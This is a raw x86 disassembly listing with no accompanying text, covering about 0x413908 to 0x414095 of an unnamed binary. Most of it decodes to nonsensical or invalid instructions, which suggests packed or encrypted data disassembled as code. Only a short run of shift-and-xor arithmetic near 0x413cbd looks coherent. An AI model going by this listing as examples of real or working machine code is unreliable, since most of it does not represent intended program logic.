  413908:	imul   DWORD PTR [esi+0x1c]
  41390b:	xchg   ebp,eax
  41390c:	(bad)  
  41390d:	mov    dh,0x3b
  41390f:	jb     0x4138d1
  413911:	lods   al,BYTE PTR ds:[esi]
  413912:	cli    
  413913:	popa   
  413914:	test   eax,0xe859e21c
  413919:	push   ecx
  41391a:	sbb    al,0x38
  41391c:	stos   BYTE PTR es:[edi],al
  41391d:	pop    ss
  41391e:	pop    edi
  41391f:	or     eax,0xf88163d1
  413924:	jae    0x41394e
  413926:	adc    al,0x26
  413928:	mov    ds:0xd9323610,al
  41392d:	mov    dh,0xf0
  41392f:	jmp    0x413951
  413931:	js     0x41395e
  413933:	sub    esp,ebp
  413935:	mov    ah,0xa
  413937:	pop    es
  413938:	mov    esp,0x22a3a4cd
  41393d:	push   ecx
  41393e:	nop
  41393f:	scas   al,BYTE PTR es:[edi]
  413940:	sub    esp,DWORD PTR [eax]
  413942:	scas   eax,DWORD PTR es:[edi]
  413943:	xlat   BYTE PTR ds:[ebx]
  413944:	das    
  413945:	das    
  413946:	mov    WORD PTR [edx],ss
  413948:	mov    ecx,0xdc3c605d
  41394d:	pop    eax
  41394e:	and    eax,0x60182452
  413953:	and    al,0xcf
  413955:	xchg   esp,eax
  413956:	or     bh,cl
  413958:	sbb    cl,dl
  41395a:	aad    0x16
  41395c:	sar    ebx,1
  41395e:	xor    eax,0x5111778e
  413963:	jge    0x413900
  413965:	cs push cs
  413967:	mul    eax
  413969:	jnp    0x413925
  41396b:	pop    edi
  41396c:	or     BYTE PTR [esi+0x48],cl
  41396f:	dec    eax
  413970:	cdq    
  413971:	dec    esi
  413972:	(bad)  [edi-0x3bf480b9]
  413978:	not    BYTE PTR [esi+0x12]
  41397b:	add    eax,0xed2f9bf5
  413980:	dec    esi
  413981:	nop
  413982:	lods   al,BYTE PTR ds:[esi]
  413983:	and    DWORD PTR [eax+0x5f693bb3],ebp
  413989:	inc    edx
  41398a:	or     dh,BYTE PTR [edx]
  41398c:	in     eax,dx
  41398d:	int    0x9
  41398f:	outs   dx,BYTE PTR ds:[esi]
  413990:	or     eax,0x5b16fece
  413995:	jb     0x4139f0
  413997:	xchg   DWORD PTR [esi-0x949180a],edi
  41399d:	sahf   
  41399e:	xor    ch,ah
  4139a0:	aas    
  4139a1:	sub    DWORD PTR [eax+eiz*8+0x76],esi
  4139a5:	cmp    DWORD PTR [ebp+0x5],edi
  4139a8:	lahf   
  4139a9:	aam    0xdd
  4139ab:	in     al,0x40
  4139ad:	mov    ds:0xc8312146,al
  4139b2:	jbe    0x4139e2
  4139b4:	sbb    bh,BYTE PTR [esi-0x49]
  4139b7:	mov    WORD PTR [ebp+0x5a69b947],es
  4139bd:	(bad)  
  4139be:	out    dx,al
  4139bf:	cs adc bh,ch
  4139c2:	pop    ebp
  4139c3:	add    al,0xcb
  4139c5:	pop    ss
  4139c6:	test   al,0x82
  4139c8:	pop    edi
  4139c9:	sbb    edx,DWORD PTR ds:0xb9e76aa1
  4139cf:	or     bh,BYTE PTR [ebp-0xe]
  4139d2:	xchg   ebp,eax
  4139d3:	sub    al,0xc
  4139d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139d6:	pop    ds
  4139d7:	cmp    ebp,ebp
  4139d9:	enter  0x58ad,0xa3
  4139dd:	mov    dl,0xfe
  4139df:	daa    
  4139e0:	push   es
  4139e1:	bound  eax,QWORD PTR [ebp-0x943871a]
  4139e7:	adc    ebx,DWORD PTR [ebx]
  4139e9:	mov    DWORD PTR [eax+ecx*8+0x2c662bce],esi
  4139f0:	mov    edi,0x36526e55
  4139f5:	and    DWORD PTR [ebp-0x72],ebp
  4139f8:	and    DWORD PTR [edi],0xe76d956d
  4139fe:	adc    BYTE PTR [edi-0x220ce1f7],0xa6
  413a05:	(bad)  
  413a06:	in     al,0x21
  413a08:	mov    eax,ds:0xe3d4eb6f
  413a0d:	push   ds
  413a0e:	xchg   ebp,eax
  413a0f:	mov    dh,0xf5
  413a12:	rol    DWORD PTR [edi-0x65],cl
  413a15:	push   esp
  413a16:	scas   eax,DWORD PTR es:[edi]
  413a17:	cmp    dl,BYTE PTR [ebx-0x271235f1]
  413a1d:	add    ebx,DWORD PTR [ebx]
  413a1f:	inc    edx
  413a20:	jmp    0xaaeb:0xcefb0d2e
  413a27:	cmp    eax,0x65fd8d73
  413a2c:	ja     0x413a25
  413a2e:	ins    DWORD PTR es:[edi],dx
  413a2f:	mov    ch,0x9
  413a31:	dec    ebx
  413a32:	clc    
  413a33:	push   ecx
  413a34:	or     ch,bl
  413a36:	aam    0xc6
  413a38:	ds add al,0xa8
  413a3b:	dec    eax
  413a3c:	adc    BYTE PTR [edi+0x3cc2ffef],bh
  413a42:	ss das 
  413a44:	loope  0x413a4b
  413a46:	sbb    eax,0x513200d9
  413a4b:	mov    WORD PTR [edi],?
  413a4d:	cdq    
  413a4e:	fistp  DWORD PTR [edi-0x2d0e4ae9]
  413a54:	lods   al,BYTE PTR ds:[esi]
  413a55:	pop    ds
  413a56:	cmp    eax,esi
  413a58:	sub    edx,esi
  413a5a:	pusha  
  413a5b:	cs xchg esi,eax
  413a5d:	xacquire xchg DWORD PTR [ebp-0x39],edx
  413a61:	lds    ecx,FWORD PTR [ecx]
  413a63:	lahf   
  413a64:	push   edi
  413a65:	xor    eax,DWORD PTR [edi-0x3bb0d982]
  413a6b:	pop    ebp
  413a6c:	inc    ecx
  413a6d:	mov    esp,0x38b51c72
  413a72:	sub    esi,edi
  413a74:	ret    0xcdf7
  413a77:	mov    cl,0x94
  413a79:	pop    ebx
  413a7a:	mov    al,ds:0x5a80bcc3
  413a7f:	mov    esi,0xf0a97d03
  413a84:	lock cld 
  413a86:	inc    ebp
  413a87:	dec    eax
  413a88:	out    dx,eax
  413a89:	test   eax,0xdff7f1d7
  413a8e:	mov    eax,ds:0xf98f35a2
  413a93:	icebp  
  413a94:	rcr    DWORD PTR [eax-0x3240f007],cl
  413a9a:	pop    eax
  413a9b:	dec    esp
  413a9c:	fldenv [edi+0x2c86a0fd]
  413aa2:	mov    ebp,0x59137dae
  413aa7:	add    al,BYTE PTR [ebx+esi*4+0x27]
  413aab:	add    al,0xa9
  413aad:	mov    BYTE PTR [ebx+0x65],al
  413ab0:	clc    
  413ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ab2:	and    al,0xee
  413ab4:	loopne 0x413a5a
  413ab6:	dec    ecx
  413ab7:	mov    eax,ds:0xa3c2e8f7
  413abc:	(bad)  
  413abd:	shl    BYTE PTR ds:0xcdc5675a,1
  413ac3:	jge    0x294b1ebb
  413ac9:	leave  
  413aca:	inc    esi
  413acb:	repz sti 
  413acd:	cmc    
  413ace:	fist   WORD PTR [edi+0x50d09439]
  413ad4:	jmp    0xf89d2185
  413ad9:	and    ebp,ebx
  413adb:	jne    0x413ac0
  413add:	in     eax,0x17
  413adf:	adc    DWORD PTR [edi+edx*8],ebp
  413ae2:	add    edx,DWORD PTR [edi+0x1cdd207e]
  413ae8:	fcomp  DWORD PTR [edx]
  413aea:	mov    ch,0x14
  413aec:	mov    al,ds:0x32c4cf7
  413af1:	pop    es
  413af2:	and    eax,DWORD PTR [esi-0x74e1f5ad]
  413af8:	sub    bl,BYTE PTR [edx]
  413afa:	sub    ch,BYTE PTR [ebx-0x44]
  413afd:	sbb    bh,dh
  413aff:	push   cs
  413b00:	or     al,0x52
  413b02:	dec    edi
  413b03:	aam    0x6d
  413b05:	ss mov cl,0xd8
  413b08:	dec    ebx
  413b09:	inc    ebx
  413b0a:	ins    BYTE PTR es:[edi],dx
  413b0b:	ffree  st(4)
  413b0d:	xchg   ebx,eax
  413b0e:	mov    ds,WORD PTR [ecx+0x22]
  413b11:	jo     0x413b56
  413b13:	mov    ebp,DWORD PTR [esi+ecx*2+0x2]
  413b17:	jle    0x413ae7
  413b19:	fcmove st,st(4)
  413b1c:	cmp    dl,bh
  413b1e:	(bad)  
  413b1f:	jnp    0x413b43
  413b21:	stos   BYTE PTR es:[edi],al
  413b22:	cmp    ah,BYTE PTR [edx+0x7b]
  413b25:	lahf   
  413b26:	retf   0xd3e6
  413b29:	cdq    
  413b2a:	sbb    eax,DWORD PTR [esi+0x73e1b227]
  413b30:	cli    
  413b31:	pop    ecx
  413b32:	xlat   BYTE PTR fs:[ebx]
  413b34:	call   0x6a45:0xebe8a6da
  413b3b:	mov    cl,0xaf
  413b3d:	out    dx,eax
  413b3e:	jnp    0x413b34
  413b40:	mov    dh,0x76
  413b42:	or     cl,BYTE PTR [edi+edi*2-0x7fec8447]
  413b49:	inc    edx
  413b4a:	mov    bl,0x89
  413b4c:	leave  
  413b4d:	jbe    0x413b85
  413b4f:	or     al,0xa9
  413b51:	cmc    
  413b52:	mov    edx,0xce7dc4b1
  413b57:	push   esp
  413b58:	or     al,0x23
  413b5a:	jp     0x413bcb
  413b5c:	std    
  413b5d:	push   edi
  413b5e:	addr16 into 
  413b60:	arpl   WORD PTR [ecx],di
  413b62:	fisubr DWORD PTR [ecx-0x21201d46]
  413b68:	ret    0xb709
  413b6b:	xor    BYTE PTR [edi],al
  413b6d:	cmc    
  413b6e:	sub    al,0xcd
  413b70:	sti    
  413b71:	or     al,0xa
  413b73:	lods   al,BYTE PTR ds:[esi]
  413b74:	retf   0xeb5e
  413b77:	push   ss
  413b78:	in     al,0x31
  413b7a:	mov    ds:0xb0a1a79f,eax
  413b7f:	mov    eax,0x3c554ef1
  413b84:	icebp  
  413b85:	arpl   WORD PTR [ecx-0x7b],bp
  413b88:	mov    ds:0x728de767,al
  413b8d:	lods   al,BYTE PTR ds:[si]
  413b8f:	adc    al,0x93
  413b91:	aaa    
  413b92:	repz jp 0x413b33
  413b95:	into   
  413b96:	fs mov bh,0x72
  413b99:	and    ch,bh
  413b9b:	push   0x7b5a0bea
  413ba0:	cwde   
  413ba1:	nop
  413ba2:	add    edi,eax
  413ba4:	stos   BYTE PTR es:[edi],al
  413ba5:	mov    dl,0xfe
  413ba7:	add    edi,esi
  413ba9:	scas   al,BYTE PTR es:[edi]
  413baa:	div    ebp
  413bac:	sub    ebx,edi
  413bae:	pop    ecx
  413baf:	sti    
  413bb0:	and    cl,BYTE PTR [edi-0x36]
  413bb3:	xor    BYTE PTR [eax],cl
  413bb5:	add    eax,0x7b39b2b0
  413bba:	cld    
  413bbb:	(bad)  
  413bbc:	jg     0x413c18
  413bbe:	out    dx,eax
  413bbf:	int    0xc4
  413bc1:	std    
  413bc2:	in     al,dx
  413bc3:	push   ecx
  413bc4:	mov    al,0x86
  413bc6:	cmp    al,0x87
  413bc8:	daa    
  413bc9:	add    esp,edx
  413bcb:	jo     0x413c15
  413bcd:	(bad)  
  413bce:	mov    dl,0x9
  413bd0:	jecxz  0x413bd8
  413bd2:	retf   0x1549
  413bd5:	mov    WORD PTR [edx+0x7f0ba098],ss
  413bdb:	fdivp  st(0),st
  413bdd:	jmp    0x9bfe:0xa2bb7d5b
  413be4:	push   ebp
  413be5:	bound  eax,QWORD PTR [ebx-0x2f]
  413be8:	jne    0x413b9f
  413bea:	fimul  DWORD PTR [edi-0x43]
  413bed:	cdq    
  413bee:	pop    edx
  413bef:	or     eax,0xd8b4993d
  413bf4:	mov    al,ds:0x3261d3e7
  413bf9:	jbe    0x413b9c
  413bfb:	sbb    eax,0xffcd8c0a
  413c00:	pop    edi
  413c01:	repnz mov ds:0x3e49178c,eax
  413c07:	jp     0x413c88
  413c09:	push   ecx
  413c0a:	mov    esp,0x90a64a3d
  413c0f:	or     DWORD PTR [eax],ebp
  413c11:	mov    ebp,0xe4f0fb0e
  413c16:	and    BYTE PTR [bp+si-0x79],bh
  413c1a:	jne    0x413bb9
  413c1c:	push   0xd6a13e09
  413c21:	(bad)  
  413c22:	call   0x4235:0x16b0ad55
  413c29:	les    ebx,FWORD PTR [ecx]
  413c2b:	pusha  
  413c2c:	addr16 gs cmc 
  413c2f:	sahf   
  413c30:	in     eax,dx
  413c31:	and    DWORD PTR [ebx-0x68],edx
  413c34:	hlt    
  413c35:	mov    dl,0x1
  413c37:	adc    esi,DWORD PTR [esi-0x3]
  413c3a:	cmp    al,0x66
  413c3c:	lock scas al,BYTE PTR es:[edi]
  413c3e:	std    
  413c3f:	push   es
  413c40:	jb     0x413c65
  413c42:	or     DWORD PTR [ebx],ebx
  413c44:	adc    esp,ebp
  413c46:	lds    esp,FWORD PTR [edi-0x19]
  413c49:	test   al,0x5c
  413c4b:	ret    
  413c4c:	cmp    al,BYTE PTR [eax]
  413c4e:	jnp    0x413bf2
  413c50:	or     ah,BYTE PTR [edx-0x3a]
  413c53:	push   esp
  413c54:	pop    edi
  413c55:	in     eax,dx
  413c56:	out    dx,al
  413c57:	or     esp,edi
  413c59:	and    DWORD PTR [ebx],eax
  413c5b:	out    0xef,eax
  413c5d:	aad    0x37
  413c5f:	adc    ch,BYTE PTR [ecx+0x53d101ad]
  413c65:	aas    
  413c66:	push   ecx
  413c67:	loopne 0x413cc3
  413c69:	cmp    bh,dh
  413c6b:	push   esi
  413c6c:	dec    eax
  413c6e:	scas   eax,DWORD PTR es:[edi]
  413c6f:	sar    ch,0xe4
  413c72:	cld    
  413c73:	push   esp
  413c74:	jp     0x413c8f
  413c76:	ret    
  413c77:	jb     0x413cd8
  413c79:	ds repnz es std 
  413c7d:	push   esi
  413c7e:	and    al,0xf9
  413c80:	or     DWORD PTR [ecx],edx
  413c82:	imul   DWORD PTR [edx+0x27eda988]
  413c88:	jge    0x413c64
  413c8a:	mov    ds:0x68c2fcb7,eax
  413c8f:	jmp    0xb34dfc13
  413c94:	(bad)  
  413c95:	dec    ah
  413c97:	mov    cl,BYTE PTR [eax-0xac7c501]
  413c9d:	aas    
  413c9e:	jnp    0x413c54
  413ca0:	out    0x69,eax
  413ca2:	mov    eax,ds:0x836011f8
  413ca7:	(bad)  
  413ca8:	jg     0x413c3d
  413caa:	fild   WORD PTR [ebx]
  413cac:	adc    BYTE PTR [ebx+0x5813d84d],cl
  413cb2:	add    al,0x6a
  413cb4:	add    dh,BYTE PTR [ebx]
  413cb6:	fimul  WORD PTR [ebx+0x2b5edc75]
  413cbc:	icebp  
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	xor    eax,0x89aa539e
  413d03:	xor    bl,BYTE PTR [eax]
  413d05:	sbb    BYTE PTR [edx+0x51181812],ch
  413d0b:	inc    ebx
  413d0c:	or     DWORD PTR [edi],esp
  413d0e:	inc    esp
  413d0f:	cwde   
  413d10:	addr16 mov al,0x43
  413d13:	scas   eax,DWORD PTR es:[edi]
  413d14:	repz je 0x413cf8
  413d17:	or     al,0x3a
  413d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d1a:	ja     0x413c9c
  413d1c:	inc    eax
  413d1d:	cmp    DWORD PTR [esi],esp
  413d1f:	xor    al,0x5f
  413d21:	repz sbb eax,edx
  413d24:	mov    ds:0xb17eda7b,al
  413d29:	stc    
  413d2a:	xchg   ebp,eax
  413d2b:	mov    DWORD PTR ds:0xc54b6bb3,edi
  413d31:	sti    
  413d32:	ja     0x413d07
  413d34:	add    esp,DWORD PTR [edx+edi*8+0x109b104f]
  413d3b:	fiadd  WORD PTR [edx-0x80]
  413d3e:	imul   esi,DWORD PTR [edx],0xffffffe4
  413d41:	sti    
  413d42:	repnz dec edx
  413d44:	out    0x1a,al
  413d46:	prefetch (bad)
  413d47:	or     eax,0x4f3c17dc
  413d4c:	test   BYTE PTR [ebp+0x774287e0],bh
  413d52:	pop    ecx
  413d53:	fmul   DWORD PTR [ebx-0x77]
  413d56:	pop    DWORD PTR [ebp+0x444372e8]
  413d5c:	add    ah,BYTE PTR [ecx+0x67]
  413d5f:	fs call 0x6d50230
  413d65:	sbb    BYTE PTR [edx+0x3],0xf1
  413d69:	dec    ebx
  413d6a:	dec    eax
  413d6b:	pusha  
  413d6c:	add    eax,0x24d20217
  413d71:	sbb    DWORD PTR ds:0xeedf1c3a,ecx
  413d77:	push   esp
  413d78:	fidivr WORD PTR [ebp+0x76]
  413d7b:	xchg   ebp,eax
  413d7c:	test   al,0xc4
  413d7e:	sbb    al,0x22
  413d80:	ret    
  413d81:	inc    ebx
  413d82:	cmp    BYTE PTR [esi+0x39],0x91
  413d86:	xor    DWORD PTR [ebx-0x3763f08b],edx
  413d8c:	das    
  413d8d:	fstp   DWORD PTR [ecx+0x66]
  413d90:	xchg   BYTE PTR [eax+ebx*1-0x47fa81e4],ah
  413d97:	test   ebp,edi
  413d99:	outs   dx,BYTE PTR ds:[esi]
  413d9a:	sar    ah,0xb2
  413d9d:	add    edx,edi
  413d9f:	scas   eax,DWORD PTR es:[edi]
  413da0:	cs sahf 
  413da2:	add    eax,0x155b8c2f
  413da7:	addr16 (bad) 
  413da9:	lock jl 0x413d67
  413dac:	pop    ds
  413dad:	inc    ebp
  413dae:	add    al,0x70
  413db0:	mov    ebx,0x2f911f3d
  413db5:	ror    BYTE PTR [ebx],cl
  413db7:	adc    BYTE PTR [eax+0x7c5c818b],0xb4
  413dbe:	adc    al,BYTE PTR [eax+0x4cea54d3]
  413dc4:	xchg   ecx,eax
  413dc5:	neg    DWORD PTR [esi+ebp*1+0x625e16f2]
  413dcc:	pop    edi
  413dcd:	push   ecx
  413dce:	fnsave [ebp+edi*1+0xe]
  413dd2:	sub    al,0x93
  413dd4:	or     eax,0xe6e91809
  413dd9:	lods   eax,DWORD PTR ds:[esi]
  413dda:	scas   eax,DWORD PTR es:[edi]
  413ddb:	das    
  413ddc:	fdivr  DWORD PTR [edi+0x38]
  413ddf:	jnp    0x413e1f
  413de1:	pop    esp
  413de2:	(bad)  
  413de3:	xchg   edx,eax
  413de4:	sbb    al,BYTE PTR [ebx]
  413de6:	or     al,0x50
  413de8:	add    eax,0xb88ff9b3
  413ded:	test   DWORD PTR [ecx+0x1e],edi
  413df0:	les    ebp,FWORD PTR [edx+0x47]
  413df3:	stos   DWORD PTR es:[edi],eax
  413df4:	clc    
  413df5:	xor    al,0x58
  413df7:	jmp    0xc1e662ce
  413dfc:	dec    ch
  413dfe:	xchg   BYTE PTR [ebp+0x5b763627],bl
  413e04:	jae    0x413e75
  413e06:	push   ebx
  413e07:	or     eax,0x8ffc4dbf
  413e0c:	(bad)  
  413e0d:	pusha  
  413e0e:	mov    esi,0xb6172b8f
  413e13:	sti    
  413e14:	scas   al,BYTE PTR es:[edi]
  413e15:	mov    ch,0x1e
  413e17:	mov    bl,0x3d
  413e19:	inc    esp
  413e1a:	js     0x413da9
  413e1c:	xor    al,0x12
  413e1e:	mov    edx,ecx
  413e20:	jmp    0x413dfb
  413e22:	mov    dl,0x18
  413e24:	xor    al,0xcc
  413e26:	mov    al,0xf3
  413e28:	jmp    0xf777a375
  413e2d:	pop    ds
  413e2e:	pop    ss
  413e2f:	clc    
  413e30:	push   ecx
  413e31:	inc    esi
  413e32:	call   0xcaca5a03
  413e37:	cvtpi2ps xmm7,QWORD PTR [esi-0x3e515ad3]
  413e3e:	adc    esi,edx
  413e40:	ins    BYTE PTR es:[edi],dx
  413e41:	leave  
  413e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e43:	lahf   
  413e44:	push   ebx
  413e45:	stos   BYTE PTR es:[edi],al
  413e46:	mov    cl,0x7f
  413e48:	add    ah,BYTE PTR [edi+0xf96af8a]
  413e4e:	cmp    al,0x25
  413e50:	pop    edx
  413e51:	std    
  413e52:	mov    ch,0x94
  413e54:	jae    0x413dff
  413e56:	xchg   ah,ah
  413e58:	mov    dh,0x45
  413e5a:	mov    ch,0x79
  413e5c:	and    al,0x71
  413e5e:	loope  0x413ebb
  413e60:	mov    cl,0xb0
  413e62:	sub    ebx,DWORD PTR [edi]
  413e64:	fdiv   DWORD PTR [esi]
  413e66:	xor    eax,0x8cdeef8
  413e6b:	inc    edx
  413e6c:	jmp    0x8fd9:0xc7217fbd
  413e73:	outs   dx,BYTE PTR ds:[esi]
  413e74:	mov    fs,WORD PTR [ecx+0x1d]
  413e77:	mov    ch,0x65
  413e79:	jb     0x413eab
  413e7b:	jns    0x413e39
  413e7d:	and    eax,0x160065d
  413e82:	test   al,0xcb
  413e84:	inc    eax
  413e85:	mov    al,0xcc
  413e87:	xchg   esp,eax
  413e88:	mov    eax,DWORD PTR [ebx+esi*2+0x549580ad]
  413e8f:	adc    eax,DWORD PTR [edx]
  413e91:	push   esi
  413e92:	add    al,0x96
  413e94:	cmp    al,0xfd
  413e96:	stos   DWORD PTR es:[edi],eax
  413e97:	mov    al,0x1c
  413e99:	mov    ebx,0xc12cb5eb
  413e9e:	dec    ebp
  413e9f:	icebp  
  413ea0:	xor    ebx,esi
  413ea2:	loope  0x413e4e
  413ea4:	inc    esp
  413ea5:	jbe    0x413eeb
  413ea7:	xor    BYTE PTR [edx],ah
  413ea9:	mov    ecx,0x12b3bc5c
  413eae:	fidiv  WORD PTR [ebx+0x58]
  413eb1:	outs   dx,DWORD PTR ds:[esi]
  413eb2:	inc    ecx
  413eb3:	aad    0x3a
  413eb5:	jno    0x413eb3
  413eb7:	cwde   
  413eb8:	pop    ebx
  413eb9:	mov    ebx,0x333a6762
  413ebe:	lea    esi,[ecx]
  413ec0:	cmp    al,0x8c
  413ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ec3:	fild   QWORD PTR [edx+0x380a89aa]
  413ec9:	inc    edx
  413eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ecb:	mov    WORD PTR [ebx],cs
  413ecd:	out    0xd1,al
  413ecf:	fs mov esp,0xf69d88d3
  413ed5:	or     al,0x17
  413ed7:	adc    ah,BYTE PTR [ebp-0x17]
  413eda:	inc    ebx
  413edb:	xor    al,0x25
  413edd:	jo     0x413e75
  413edf:	mov    ecx,0xc5c9a71d
  413ee4:	lods   al,BYTE PTR ds:[esi]
  413ee5:	hlt    
  413ee6:	ja     0x413f40
  413ee8:	pop    ss
  413ee9:	fld    QWORD PTR [edx]
  413eeb:	inc    ebp
  413eec:	jno    0x413f5b
  413eee:	in     al,0xee
  413ef0:	xor    DWORD PTR [ecx+ecx*1-0x50],eax
  413ef4:	popf   
  413ef5:	cdq    
  413ef6:	in     al,dx
  413ef7:	mov    ah,ah
  413ef9:	popa   
  413efa:	inc    eax
  413efb:	push   ds
  413efc:	jg     0x413e86
  413efe:	dec    ebx
  413eff:	in     eax,dx
  413f00:	push   edx
  413f01:	stc    
  413f02:	test   DWORD PTR [esi+edi*8+0x72],ebx
  413f06:	fmul   QWORD PTR [ebx-0x25411681]
  413f0c:	or     al,0xbc
  413f0e:	xor    DWORD PTR [ebx],edi
  413f10:	xchg   esp,eax
  413f11:	pop    edi
  413f12:	dec    BYTE PTR [edi+0x7]
  413f15:	jecxz  0x413efb
  413f17:	fidiv  DWORD PTR [esi+0x9]
  413f1a:	rol    DWORD PTR [eax-0x62],0x67
  413f1e:	sar    DWORD PTR [edx-0x4e],1
  413f21:	xor    DWORD PTR ds:0x6334e650,0xd3cb35d6
  413f2b:	pop    ebx
  413f2c:	jle    0x413f8b
  413f2e:	add    BYTE PTR [edi-0x7],0x85
  413f32:	sbb    al,0x67
  413f34:	or     esi,DWORD PTR ds:0xfe9060c6
  413f3a:	jp     0x413f7d
  413f3c:	(bad)  
  413f3d:	addr16 mov ch,0xf4
  413f40:	push   edx
  413f41:	pushf  
  413f42:	and    dl,BYTE PTR [edi-0x7]
  413f45:	xchg   DWORD PTR [ecx+0x6c],ebx
  413f48:	jmp    0xaf0da536
  413f4d:	inc    ebx
  413f4e:	xchg   edi,eax
  413f4f:	mov    ds:0x49bb2bc1,al
  413f54:	xchg   esi,eax
  413f55:	out    dx,eax
  413f56:	cli    
  413f57:	out    dx,eax
  413f58:	xchg   ecx,eax
  413f59:	out    0x8f,eax
  413f5b:	and    eax,DWORD PTR [edx-0x70]
  413f5e:	leave  
  413f5f:	push   cs
  413f60:	jg     0x413f5d
  413f62:	lea    edx,[esi+0x2f]
  413f65:	sub    al,0x58
  413f67:	outs   dx,DWORD PTR ds:[esi]
  413f68:	out    dx,al
  413f69:	sub    BYTE PTR [ebx+ebx*4],0x8d
  413f6d:	pop    esp
  413f6e:	push   ecx
  413f6f:	pop    esi
  413f70:	push   esp
  413f71:	inc    edx
  413f72:	iret   
  413f73:	mov    esp,0x80b10030
  413f78:	in     al,0xfb
  413f7a:	ds xchg esp,eax
  413f7c:	inc    ebx
  413f7d:	jp     0x413f20
  413f7f:	call   0xb087:0x5b7271fd
  413f86:	xor    eax,0xcf0234ca
  413f8b:	mov    BYTE PTR [edx+ebx*1-0x69],ch
  413f8f:	ja     0x413f2d
  413f91:	daa    
  413f92:	lods   eax,DWORD PTR ds:[esi]
  413f93:	rcl    dl,1
  413f95:	mov    al,0xa0
  413f97:	out    0x5d,al
  413f99:	mov    DWORD PTR [esi+eax*2+0x40],ecx
  413f9d:	enter  0x5fe,0xdb
  413fa1:	add    bh,BYTE PTR [eax-0x68]
  413fa4:	popa   
  413fa5:	in     eax,dx
  413fa6:	into   
  413fa7:	out    dx,al
  413fa8:	jo     0x414001
  413faa:	sub    esi,DWORD PTR [eax+eiz*4]
  413fad:	mov    eax,0x417aa4fe
  413fb2:	jno    0x413f4a
  413fb4:	mul    DWORD PTR [ebx]
  413fb6:	and    al,0x78
  413fb8:	and    ebx,esi
  413fba:	mov    ebx,DWORD PTR [edi+0x3e]
  413fbd:	and    ax,0x5a2f
  413fc1:	inc    ebp
  413fc2:	scas   al,BYTE PTR es:[edi]
  413fc3:	pop    ebx
  413fc4:	aas    
  413fc5:	pop    ebx
  413fc6:	cmp    ecx,edi
  413fc8:	mov    edx,0x225e4432
  413fcd:	repz (bad) 
  413fcf:	nop
  413fd0:	into   
  413fd1:	push   esp
  413fd2:	lods   eax,DWORD PTR ds:[esi]
  413fd3:	dec    edi
  413fd4:	aaa    
  413fd5:	pop    ebx
  413fd6:	daa    
  413fd7:	sub    eax,0x513d8241
  413fdc:	xchg   esp,eax
  413fdd:	xor    eax,0x441206f
  413fe2:	adc    al,0x3e
  413fe4:	add    eax,0xa4466034
  413fe9:	in     eax,dx
  413fea:	or     edx,DWORD PTR [ebp+0x4bba47bb]
  413ff0:	sub    ch,BYTE PTR [ebx]
  413ff2:	test   eax,0xfaafe023
  413ff7:	lods   eax,DWORD PTR ds:[esi]
  413ff8:	loop   0x413fb2
  413ffa:	pop    ebx
  413ffb:	or     al,cl
  413ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ffe:	pushf  
  413fff:	ja     0x41407b
  414001:	jecxz  0x414049
  414003:	stos   BYTE PTR es:[edi],al
  414004:	stc    
  414005:	scas   al,BYTE PTR es:[edi]
  414006:	or     BYTE PTR [eax+ecx*1+0x20],bl
  41400a:	out    0x16,eax
  41400c:	je     0x41402f
  41400e:	repnz mov ebp,0x6315f1b0
  414014:	das    
  414015:	lock leave 
  414017:	adc    al,0x55
  414019:	push   cs
  41401a:	inc    ebp
  41401b:	sbb    DWORD PTR [edi-0x22],ecx
  41401e:	or     bl,bh
  414020:	and    eax,0xc374111b
  414025:	mov    eax,0x2a6604bf
  41402a:	add    al,0xed
  41402c:	test   dh,0x6e
  41402f:	(bad)  
  414030:	xchg   esp,eax
  414031:	fwait
  414032:	or     al,0x54
  414034:	ins    BYTE PTR es:[edi],dx
  414035:	cmp    al,0x24
  414037:	mov    ah,0x17
  414039:	mov    ebp,0xffcff435
  41403e:	xchg   BYTE PTR [ecx+0x73],cl
  414041:	cmp    eax,DWORD PTR [edi+eiz*1-0x41335c48]
  414048:	and    DWORD PTR [edi],ebx
  41404a:	leave  
  41404b:	fnstsw WORD PTR [ecx]
  41404d:	jns    0x413fe5
  41404f:	ret    0xe6c1
  414052:	lahf   
  414053:	pop    es
  414054:	loopne 0x414031
  414056:	sbb    DWORD PTR [ebp+esi*4-0x4c],ebx
  41405a:	sbb    eax,0x416f9174
  41405f:	cmp    esp,DWORD PTR [edx+0xe]
  414062:	jge    0x414079
  414064:	out    dx,eax
  414065:	cmp    DWORD PTR [edx],edx
  414067:	jmp    0x3c053009
  41406c:	sbb    cl,ch
  41406e:	sbb    al,0x8f
  414070:	cli    
  414071:	or     al,0x32
  414073:	xor    eax,DWORD PTR [edi+ecx*8-0x62366604]
  41407a:	lea    ebx,[edi-0x39]
  41407d:	in     eax,0x73
  41407f:	mov    dl,0x1b
  414081:	jbe    0x414023
  414083:	add    bh,ch
  414085:	aaa    
  414086:	pop    ss
  414087:	jbe    0x414063
  414089:	pushf  
  41408a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41408b:	in     eax,dx
  41408c:	cmp    al,0x55
  41408e:	out    0xaa,al
  414090:	(bad)  
  414091:	shr    DWORD PTR [ebx],cl
  414093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414094:	retf   
  414095:	icebp  
